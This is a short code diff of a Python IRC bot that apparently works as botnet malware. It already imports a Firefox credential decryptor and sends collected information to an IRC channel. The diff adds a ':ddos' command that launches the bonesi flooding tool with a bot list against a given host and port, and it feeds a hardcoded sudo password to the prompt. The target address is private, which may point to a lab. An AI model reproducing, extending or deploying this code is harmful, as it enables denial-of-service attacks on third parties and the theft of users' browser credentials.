@@ -1,7 +1,8 @@
 import socket
-import numpy as np
+#import numpy as np
 import random
 from firefox_decrypt import *
+import pexpect
 
 bot_owner = "QuyenVu"
 botID = str( random.randint(1,1000))
@@ -21,6 +22,9 @@ while 1:
       a = format(get_information())
       print a
       sock.send("PRIVMSG " + chan + " :{0}\r\n".format(a))
+   if command == ":ddos":
+      child = pexpect.spawn("sudo bonesi -i 50k-bots -p udp -r 0 -u 192.168.2.101:80")
+      child.sendline("vudinhquyen")
    print " "
    if data[0:4] == "PING":
       sock.send(data.replace("PING", "PONG"))
